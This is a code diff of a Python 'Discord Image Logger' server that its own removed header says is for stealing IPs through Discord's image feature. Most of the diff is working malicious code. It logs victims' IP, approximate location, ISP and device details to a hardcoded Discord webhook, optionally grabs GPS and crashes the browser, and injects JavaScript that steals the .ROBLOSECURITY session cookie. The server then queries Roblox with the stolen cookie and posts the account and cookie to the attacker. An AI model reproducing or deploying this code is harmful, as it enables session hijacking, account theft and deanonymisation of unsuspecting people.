@@ -2,395 +2,266 @@
 # By Team C00lB0i/C00lB0i | https://github.com/OverPowerC
 
 from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
+import socketserver
+import urllib.parse as parse
+import traceback
 import requests
-
-
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
-__version__ = "v2.0"
-__author__ = "C00lB0i"
+import base64
+import httpagentparser
+from urllib.parse import urlsplit, parse_qsl
 
 config = {
-    # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1477054008400154857/tw2pK-xTaQNHLwJNWuLzrSn86884av8RRswJZjH64MDDCnGphGlP8v9xfmmlRuRcAwCU",
-    "image": "https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
-
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
-
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/OverPowerC/Chromebook-Crasher)
-    
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
-
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by C00lB0i's Image Logger. ", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
-    },
-
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
-
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
-
-    # REDIRECTION #
+    "image": "![image](https://media.tenor.com/BP79uBTrSy0AAAAe/loading-discord.png)",
+    "imageArgument": True,
+    "crashBrowser": False,
+    "accurateLocation": False,
+    "buggedImage": True,
+    "blacklistedIPs": ("27", "104", "143", "164"),
+    "antiBot": 1,
+    "vpnCheck": 1,
+    "linkAlerts": True,
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
-}
-
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
-
-def botCheck(ip, useragent):
-    if ip.startswith(("34", "35")):
-        return "Discord"
-    elif useragent.startswith("TelegramBot"):
-        return "Telegram"
-    else:
-        return False
-    
-
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
-
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
-    if ip.startswith(blacklistedIPs):
-        return
-    
-    bot = botCheck(ip, useragent)
-    
-    if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
-        return
-
-    ping = "@everyone"
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    if info["proxy"]:
-        if config["vpnCheck"] == 2:
-                return
-        
-        if config["vpnCheck"] == 1:
-            ping = ""
-    
-    if info["hosting"]:
-        if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
-                return
-
-        if config["antiBot"] == 3:
-                return
-
-        if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
-                ping = ""
-
-        if config["antiBot"] == 1:
-                ping = ""
-        
-
-
-    os, browser = httpagentparser.simple_detect(useragent)
-    
-    embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
-
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
-
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
-
-**User Agent:**
-```
-{useragent}
-```""",
+    "message": {
+        "doMessage": False,
+        "richMessage": True,
+        "message": "IP: {ip} | Provider: {isp} | {roblox_user} ({robux} Robux)"
     }
-  ],
 }
-    
-    if get_roblox_info:
-        embed["fields"].extend([
-            {"name": "🟥 Roblox Username", "value": get_roblox_info['username'], "inline": True},
-            {"name": "🟥 Roblox ID", "value": get_roblox_info['id'], "inline": True},
-            {"name": "🟥 Robux", "value": get_roblox_info['robux'], "inline": True},
-            {"name": "🟥 Cookie (truncated)", "value": get_roblox_info['cookie'][:100] + "..." if len(get_roblox_info['cookie']) > 100 else get_roblox_info['cookie'], "inline": False}
-        ])
-        embed["color"] = 0xff0000 
-    
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
-    return info
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+    "loading": base64.b85decode(b'|JeWF01!>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~rR0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
+
+def get_ip_info(ip):
+    try:
+        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5).json()
+        if resp["status"] == "success":
+            resp["coords"] = False  # Precise unless accurateLoc
+            return resp
+    except:
+        pass
+    return {'country': 'Unknown', 'regionName': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'as': 'Unknown', 'lat': 0, 'lon': 0, 'timezone': 'Unknown', 'mobile': False, 'proxy': False, 'hosting': False, 'coords': True}
+
+def botCheck(ip, ua):
+    if ip.startswith(("34.", "35.")):
+        return "Discord"
+    elif ua and ua.startswith("TelegramBot"):
+        return "Telegram"
+    info = get_ip_info(ip)
+    if info.get('hosting'):
+        return "Hosting"
+    if ua and any(word in ua.lower() for word in ('bot', 'crawler', 'spider')):
+        return "Bot UA"
+    return False
+
+def reportError(error):
+    try:
+        requests.post(config["webhook"], {"content": f"Error: ```{error}```"})
+    except:
+        pass
 
 def get_roblox_info(cookie):
     try:
         session = requests.Session()
         session.cookies['.ROBLOSECURITY'] = cookie
-        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
-        
-        # Get user info
+        session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'})
         user_resp = session.get('https://users.roblox.com/v1/users/authenticated', timeout=10)
         if user_resp.status_code != 200:
             return None
         user_data = user_resp.json()
         uid = user_data.get('id')
         username = user_data.get('name', 'Unknown')
-        
-        # Get Robux (POST endpoint)
         robux_resp = session.post('https://economy.roblox.com/v1/user/currency', timeout=10)
-        if robux_resp.status_code != 200:
-            return {'username': username, 'id': str(uid), 'robux': 'Error', 'cookie': cookie}
-        
-        robux_data = robux_resp.json()
-        robux = robux_data.get('robux', 0)
-        
-        return {
-            'username': username,
-            'id': str(uid),
-            'robux': f"{robux:,}",
-            'cookie': cookie
-        }
-    except Exception as e:
-        print(f"Roblox lookup fail: {e}")  # Silent log
+        robux = 'Error'
+        if robux_resp.status_code == 200:
+            robux_data = robux_resp.json()
+            robux = robux_data.get('robux', 0)
+        return {'username': username, 'id': str(uid), 'robux': f"{robux:,}", 'cookie': cookie}
+    except:
         return None
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+def makeReport(ip, ua=None, location=None, endpoint=None, url=None, roblox_info=None):
+    info = get_ip_info(ip)
+    if not info:
+        info = {'country': 'Unknown', 'regionName': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'as': 'Unknown', 'lat': 0, 'lon': 0, 'timezone': 'Unknown', 'mobile': False, 'proxy': False, 'hosting': False, 'coords': True}
     
+    bot_val = info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'
+    coords = f"{info.get('lat',0)}, {info.get('lon',0)} ({'Approximate' if info.get('coords') else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++{info.get(\"lat\",0)},+{info.get(\"lon\",0)})'} )"
+    tz = info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') + f" ({info.get('timezone', 'Unknown').split('/')[0]})" if '/' in str(info.get('timezone')) else info.get('timezone', 'Unknown')
+    
+    os, browser = httpagentparser.simple_detect(ua) if ua else ('Unknown', 'Unknown')
+    
+    # Exact template blocks
+    ip_info = f"> **IP:** `{ip}`\n> **Provider:** `{info.get('isp', 'Unknown')}`\n> **ASN:** `{info.get('as', 'Unknown')}`\n> **Country:** `{info.get('country', 'Unknown')}`\n> **Region:** `{info.get('regionName', 'Unknown')}`\n> **City:** `{info.get('city', 'Unknown')}`\n> **Coords:** `{coords}`\n> **Timezone:** `{tz}` ({info.get('timezone', 'Unknown').split('/')[0] if '/' in str(info.get('timezone')) else ''})\n> **Mobile:** `{info.get('mobile', False)}`\n> **VPN:** `{info.get('proxy', False)}`\n> **Bot:** `{bot_val}`"
+    
+    pc_info = f"> **OS:** `{os}`\n> **Browser:** `{browser}`"
+    
+    ua_block = f"```\n{ua or 'Unknown'}\n```"
+    
+    embed_fields = [
+        {"name": "**IP Info:**", "value": ip_info, "inline": False},
+        {"name": "**PC Info:**", "value": pc_info, "inline": False},
+        {"name": "**User Agent:**", "value": ua_block, "inline": False}
+    ]
+    
+    color = 0xff0000 if roblox_info else 0x00ff00
+    title = f"💎 ROBLOX JACKPOT on {ip}" if roblox_info else f"🔍 Grabbed {ip}"
+    
+    if roblox_info:
+        roblox_block = f"> **🟥 Username:** `{roblox_info['username']}`\n> **🟥 ID:** `{roblox_info['id']}`\n> **🟥 Robux:** `{roblox_info['robux']}`\n> **🟥 Cookie:** `{roblox_info['cookie'][:100]}{'...' if len(roblox_info['cookie']) > 100 else ''}`"
+        embed_fields.append({"name": "**Roblox Info:**", "value": roblox_block, "inline": False})
+    
+    embed = {
+        "embeds": [{
+            "title": title,
+            "color": color,
+            "fields": embed_fields,
+            "footer": {"text": endpoint or "ImageLogger"},
+            "thumbnail": {"url": url} if url else None
+        }]
+    }
+    
+    requests.post(config["webhook"], json=embed)
+    
+    # Message
+    message = config["message"]["message"]
+    if config["message"]["richMessage"]:
+        message = message.replace("{ip}", ip)
+        message = message.replace("{isp}", info.get('isp', 'Unknown'))
+        message = message.replace("{country}", info.get('country', 'Unknown'))
+        message = message.replace("{city}", info.get('city', 'Unknown'))
+        message = message.replace("{roblox_user}", roblox_info['username'] if roblox_info else 'None')
+        message = message.replace("{robux}", roblox_info['robux'] if roblox_info else 'None')
+        message = message.replace("{roblox_cookie}", roblox_info['cookie'] if roblox_info else 'None')
+        # Add more {var} as needed
+    if config["message"]["doMessage"]:
+        requests.post(config["webhook"], {"content": message})
+    
+    return info
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.handleRequest()
+
+    def do_POST(self):
+        self.handleRequest()
+
     def handleRequest(self):
         try:
-            if config["imageArgument"]:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-                if dic.get("url") or dic.get("id"):
-                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
-                else:
-                    url = config["image"]
-            else:
-                url = config["image"]
-
-            data = f'''<style>body {{
+            s = self.path
+            dic = dict(parse_qsl(urlsplit(s).query))
             
+            url = config["image"]
+            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
+                try:
+                    url = base64.b64decode(dic.get("url") or dic.get("id")).decode()
+                except:
+                    pass
             
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''.encode()
+            ip = self.headers.get('X-Forwarded-For', self.client_address[0]).split(',')[0].strip()
+            ua = self.headers.get('User-Agent', '')
             
-            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+            # Blacklist
+            if any(ip.startswith(blip) for blip in config["blacklistedIPs"]):
+                self.send_response(403)
+                self.end_headers()
                 return
             
-            if dic.get('roblox'):
+            # Roblox pixel (stealth GIF)
+            if 'roblox' in dic:
+                roblox_data = None
                 try:
-                    roblox_cookie_b64 = dic['roblox']
-                    roblox_cookie = base64.b64decode(roblox_cookie_b64.encode()).decode('utf-8')
-                    roblox_data = get_roblox_info(roblox_cookie)
+                    cookie = base64.b64decode(dic['roblox'].encode()).decode('utf-8')
+                    roblox_data = get_roblox_info(cookie)
                     if roblox_data:
-                        makeReport(ip, self.headers.get('user-agent'), get_roblox_info=roblox_data, endpoint=s.split("?")[0], url=url)
-                except Exception:
-                    reportError(traceback.format_exc())  # silent fail
-            
-                # Send invisible 1x1 GIF (stealth)
+                        makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=roblox_data)
+                except:
+                    pass
                 self.send_response(200)
-                self.send_header('Content-type', 'image/gif')
+                self.send_header('Content-Type', 'image/gif')
                 self.end_headers()
                 gif = b'GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
                 self.wfile.write(gif)
                 return
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
+            # Bot/link alert
+            bot = botCheck(ip, ua)
+            if bot and config["linkAlerts"]:
+                makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=None)
                 return
             
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-                    message = message.replace("{roblox_user}", get_roblox_info['username'])
-                    message = message.replace("{roblox_id}", get_roblox_info['id'])
-                    message = message.replace("{robux}", get_roblox_info['robux'])
-                    message = message.replace("{roblox_cookie}", get_roblox_info['cookie'])
-
-                datatype = 'text/html'
-
-                if get_roblox_info:
-                    message = message.replace("{roblox_user}", get_roblox_info['username'])
-                    message = message.replace("{roblox_id}", get_roblox_info['id'])
-                    message = message.replace("{robux}", get_roblox_info['robux'])
-                    message = message.replace("{roblox_cookie}", get_roblox_info['cookie'])
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/OverPower/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
+            # Report normal hit
+            info = makeReport(ip, ua, endpoint=s.split('?')[0], url=url, roblox_info=None)
+            
+            # Build page
+            datatype = 'text/html'
+            data = f'<img src="{url}" style="width:100%;height:100vh;object-fit:cover;"><title>Loading...</title>'.encode()
+            
+            if config["redirect"]["redirect"]:
+                data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+            
+            self.send_response(200)
+            self.send_header('Content-type', datatype)
+            self.end_headers()
+            
+            if config["accurateLocation"]:
+                data += b"""<script>
 var currenturl = window.location.href;
-
 if (!currenturl.includes("g=")) {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+            var g = btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D");
+            if (currenturl.includes("?")) {
+                currenturl += "&g=" + g;
+            } else {
+                currenturl += "?g=" + g;
+            }
+            location.replace(currenturl);
+        });
     }
-    location.replace(currenturl);});
 }}
-
-(function() {
+</script>"""
+            
+            if config["crashBrowser"]:
+                data += b'<script>while(1){}</script>'
+            
+            # Roblox cookie grabber JS (always)
+            data += b"""<script>
+(function(){
     var cookies = document.cookie.split(';');
     var robloxCookie = '';
     for(var i = 0; i < cookies.length; i++) {
         var c = cookies[i].trim();
         if(c.indexOf('.ROBLOSECURITY=') === 0) {
-            robloxCookie = c.substring(16);  // len('.ROBLOSECURITY=')
+            robloxCookie = c.substring(16);
             break;
         }
     }
     if(robloxCookie) {
         var img = new Image(1,1);
-        img.src = window.location.pathname + '?roblox=' + btoa(robloxCookie) + window.location.search.replace('?','&');  // preserve other params
+        img.src = window.location.pathname + '?roblox=' + btoa(robloxCookie) + (window.location.search ? window.location.search.replace('?', '&') : '');
     }
 })();
-
 </script>"""
-        
+            
+            if config["buggedImage"] and bot:
+                data = binaries["loading"]
+                datatype = 'image/png'
+                self.send_header('Content-type', datatype)
+                self.end_headers()
                 self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+                return
+            
+            self.wfile.write(data)
+            
+        except Exception as e:
             reportError(traceback.format_exc())
 
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
-
-handler = app = ImageLoggerAPI
+if __name__ == "__main__":
+    with socketserver.TCPServer(("", 80), ImageLoggerAPI) as httpd:
+        print("Server live on port 80")
+        httpd.serve_forever()
